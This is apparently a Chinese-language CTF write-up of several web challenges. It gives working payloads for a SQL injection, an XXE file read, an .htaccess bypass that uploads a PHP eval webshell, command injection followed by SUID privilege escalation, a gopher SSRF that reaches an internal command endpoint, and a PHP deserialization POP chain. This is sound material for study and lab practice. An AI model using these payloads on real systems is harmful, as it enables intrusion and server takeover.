---
create: 2026-01-18T12:49
updated: 2026-01-20T15:39
---
## Web

### SQL??

`id=-1 union select 1,2,3,sqlite_version(),(select group_concat(flag) from flag)—`

NSSCTF{Funny_Sq11111111ite!!!}

### (>_<)

首先是代码审计,可以看出是python的flask框架

```python
from flask import Flask,request
import base64
from lxml import etree
import re
app = Flask(**name**)

@app.route('/')
def index():
return open(**file**).read()

@app.route('/ghctf',methods=['POST'])

# 在这里看出来是XEE外部实体注入
def parse():
xml=request.form.get('xml')
print(xml)
if xml is None:
return "No System is Safe."
parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
root = etree.fromstring(xml, parser)
name=root.find('name').text
return name or None


if **name**=="**main**":
app.run(host='0.0.0.0',port=8080)
```

### 简单的XEE漏洞

POC：

```python
import requests
url = "http://node2.anna.nssctf.cn:28487/ghctf"
xml = '''<?xml version="1.0"?>
<!DOCTYPE test[
    <!ENTITY nn SYSTEM "file:///flag">
]>
<user>
    <name>&nn;</name>
    <age>18</age>
</user>'''
response = requests.post(url, data={"xml": xml})
print(response.text)
```

NSSCTF{2183a908-4724-4bfb-9cd1-6f72b0dfeeaf}

### UPUPUP

考点：getimagesize和exif_imagetype绕过；apache利用.htaccess；来实现对图片的包含，但是后端文件对mine类型进行了检验,并且如果.htaccess的开头存在GIF89A(GIF标志头子节)，会出现语法错误，于是尝试#（\x00）注释

.htaccess

```php
#define width 1
#define height 1
<FilesMatch "hey.hey">
SetHandler  application/x-httpd-php
</FilesMatch>
```

upload.file

```php
#define width 1
#define height 1
<?php eval($_REQUEST[1]);?>
```

!![[image 3.png]]

即可连接并获取flag

### getshell

代码审计，发现存在如下的命令执行函数，好像是会将接受到的命令放入标准输入流，并获取标准输出流的输出

```php
class CommandExecutor {
    private $logger;

    public function __construct($logger) {
        $this->logger = $logger;
    }

    public function execute($input) {
        if (strpos($input, ' ') !== false) {
            $this->logger->log("Invalid input: space detected");
            die('No spaces allowed');
        }

        @exec($input, $output);
        $this->logger->log("Result: $input");
        return implode("\n", $output);
    }
}
```

同时发现存在额外的action选项来归类当前网页用于何种进程分别是

- run 执行input代码
- debug 启动调式模式
- generate 产生随机字符串

```php
class ActionHandler {
    private $config;
    private $logger;
    private $executor;

    public function __construct($config, $logger) {
        $this->config = $config;
        $this->logger = $logger;
        $this->executor = new CommandExecutor($logger);
    }

    public function handle($action, $input) {
        if (!in_array($action, $this->config->get('allowed_actions'))) {
            return "Invalid action";
        }

        if ($action === 'run') {
            $validator = new InputValidator($this->config->get('max_input_length'));
            $validationResult = $validator->validate($input);
            if ($validationResult !== true) {
                return $validationResult;
            }

            return $this->executor->execute($input);
        } elseif ($action === 'debug') {
            return "Debug mode enabled";
        } elseif ($action === 'generate') {
            return "Random string: " . StringUtils::generateRandomString(15);
        }

        return "Unknown action";
    }
}
```

**payload：**

`?action=run&input=echo%09PD9waHAgZXZhbCgkX1BPU1RbMF0pOz8%2b|base64%09-d%3Es
hell.php`

PD9waHAgZXZhbCgkX1BPU1RbMF0pOz8+|base64	-d>

将<?php eval($_POST[0]); ?>,以base64的形式写入shell.php文件中

成功获取webshell，并连接蚁剑

**Suid提权**

此时发现没有权限；进⾏suid提权试试：所谓suid就是，你本来是www-data的权限，但是当你执⾏有
suid权限的⽂件时，你会暂时拥有这⽂件所有者的权限（⽐如root）

```shell
find / -user root -perm -4000 -print 2>/dev/null
result:
(www-data:/var/www/html) $ find / -user root -perm -4000 -print 2>/dev/nul
l
/var/www/html/wc
/bin/umount
/bin/mount
/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
```

利用网址[https://gtfobins.github.io/](https://gtfobins.github.io/)，发现只有wc可以实现suid提权，按照给出的方法直接读取对应的flag

!![[image 4.png]]

!![[image 5.png]]

/var/www/html/wc --files0-from "/flag”

NSSCTF{037dc8cf-e52b-4cc6-b215-f05271bf90c4}

[[反弹shell的🐎]]

[[公钥ssh登录]]

### Goph3rrr

在页面中没有发现有用的信息，查看当前源代码也没有相关的代码，于是尝试使用目录扫描来发现当前环境的特殊文件.发现存在两个特殊文件，分别为app.py和upload.判断为python后端的文件上传漏洞

!![[image 6.png]]

这是一个**SSRF**

```python
@app.route('/Gopher')
def visit():
    url = request.args.get('url')
    if url is None:
        return "No url provided :)"
    url = urlparse(url)
    realIpAddress = socket.gethostbyname(url.hostname)
    if url.scheme == "file" or realIpAddress in BlackList:
        return "No (≧∇≦)"
    result = subprocess.run(["curl", "-L", urlunparse(url)], capture_output=True, text=True)
    return result.stdout
```

```python
@app.route('/Manage', methods=['POST'])
def cmd():
    if request.remote_addr != "127.0.0.1":
        return "Forbidden!!!"
    if request.method == "GET":
        return "Allowed!!!"
    if request.method == "POST":
        return os.popen(request.form.get("cmd")).read()
```

保留主要信息，并利用两次url编码

```json
POST /Manage HTTP/1.1
host:127.0.0.1
Content-Type:application/x-www-form-urlencoded
Content-Length:7
cmd=env
```

!![[image 7.png]]

错误的编码

```php
POST%2B%252FManage%2BHTTP%252F1.1%250D%250Ahost%253A127.0.0.1%250D%250AContent-Type%253Aapplication%252Fx-www-form-urlencoded%250D%250AContent-Length%253A7%250D%250Acmd%253Denv
```

正确的编码

```php
POST%2520%252FManage%2520HTTP%252F1.1%250Ahost%253A127.0.0.1%250AContent-Type%253Aapplication%252Fx-www-form-urlencoded%250AContent-Length%253A7%250A%250Acmd%253Denv
```

这个两次编码会有问题，解释是这样

[[造成两次编码不一致的关键点]]

[[解决方案]]

```php
GET /Gopher?url=gopher://127.0.0.2:8000/_POST%2520%252FManage%2520HTTP%252F1.1%250Ahost%253A127.0.0.1%250AContent-Type%253Aapplication%252Fx-www-form-urlencoded%250AContent-Length%253A7%250A%250Acmd%253Denv HTTP/1.1
Host: node6.anna.nssctf.cn:20618
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Cookie: Hm_lvt_648a44a949074de73151ffaa0a832aec=1741656577; _ga=GA1.2.974377946.1728461963; _ga_E03P28539Z=GS1.2.1728461963.1.1.1728462011.0.0.0; Hm_lpvt_648a44a949074de73151ffaa0a832aec=1741656577; HMACCOUNT=1960B6983CBFA543
Priority: u=0, i
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate


```

即可出flag:**NSSCTF{851b0bf3-33fe-41bc-8585-dd14d1f7af3a}**

### Popppppp

php反序列化，寻找pop链,发现以下函数可以用来调用，用于利用原生类的函数Mystery,这段代码是魔术魔方 __get() ；而此时我们就想要如何触发这个  __get() 函数呢？在从不可访问的属性读取数据或者不存在这个键都会调用  __get()  方法

```php
class Mystery {
    public function __get($arg1) {
        array_walk($this, function ($day1, $day2) {
            $day3 = new $day2($day1);
            foreach ($day3 as $day4) {
                echo ($day4 . '<br>');
            }
        });
    }
}
```

现在   Philosopher  这个类中存在访问不存在的键值   key  这个操作，自然就会触发   __get()  函数，发现该函数是魔术魔方 __invoke() ；那么我们就继续想如何才能触发这个  __invoke() 函数呢？当尝试将对象调用为函数时触发 __invoke() 。所以此时我们就需要寻找有哪个对象被当作函数进行调用了。同时在这里还存在一个双重md5绕过。

```php
class Philosopher {
    public $fruit10;
    public $fruit11="sr22kaDugamdwTPhG5zU";

    public function __invoke() {
        if (md5(md5($this->fruit11)) == 666) {
            return $this->fruit10->hey;
        }
    }
}
```

发现在Warlord中存在call函数调用的操作，那么我们就继续想如何才能触发这个  __call() ；在对象
上下文中调用不可访问的方法或不存在的方法时触发 __call()

```php
class Warlord {
    public $fruit4;
    public $fruit5;
    public $arg1;

    public function __call($arg1, $arg2) {
        $function = $this->fruit4;
        return $function();
    }

    public function __get($arg1) {
        $this->fruit5->ll2('b2');
    }
}
```

在Samurai这个类中出现了不可访问的方法add()，此时就会触发__call()函数，同时观察到该函数为魔术魔方 __toString() ；那么我们就继续想如何才能触发这个  __toString() 函数呢？在将对象当作字符串使用时就会触发  __toString()；所以此时我们就需要寻找有哪个对象被当作字符串进行调用了

```php
class Samurai {
    public $fruit6;
    public $fruit7;

    public function __toString() {
        $long = @$this->fruit6->add();
        return $long;
    }

    public function __set($arg1, $arg2) {
        if ($this->fruit7->tt2) {
            echo "xxx are the best!!!";
        }
    }
}
```

发现在CherryBolossom类中出现了将对象fruit1当作字符串进行使用的操作，将其作为开头

```php
class CherryBlossom {
    public $fruit1;
    public $fruit2;

    public function __construct($a) {
        $this->fruit1 = $a;
    }

    function __destruct() {
        echo $this->fruit1;
    }

    public function __toString() {
        $newFunc = $this->fruit2;
        return $newFunc();
    }
}
```

Pop链设计

```php
CherryBlossom{__destruct()} -->  Samurai{__toString()} --> Warlord{__call
()} --> Philosopher{__invoke()} --> Mystery{__get()}
```

[[双重MD5绕过]]

构造pop链，生成反序列化链接

```php
<?php
error_reporting(0);
class CherryBlossom
{
    public $fruit1;
    public $fruit2;
    function __destruct()
    {
        echo $this->fruit1;
    }
    public function __toString()
    {
        $newFunc = $this->fruit2;
        return $newFunc();
    }
}
class Mystery
{
    public $GlobIterator="/*";
    public function __get($arg1)
    {
        array_walk($this, function ($day1, $day2) {
            $day3 = new $day2($day1);
            foreach ($day3 as $day4) {
                echo($day4 . '<br>');
            }
        });
    }
}
class Philosopher
{
    public $fruit10;
    public $fruit11="rSYwGEnSLmJWWqkEARJp";

    public function __invoke()
    {
        if (md5(md5($this->fruit11)) == 666) {
            return $this->fruit10->hey;
        }
    }
}
$b=new CherryBlossom();
$b->fruit1=new CherryBlossom();
$b->fruit1->fruit2=new Philosopher();
$b->fruit1->fruit2->fruit10=new Mystery();

$c=serialize($b);
echo $c;
```

### easy_upload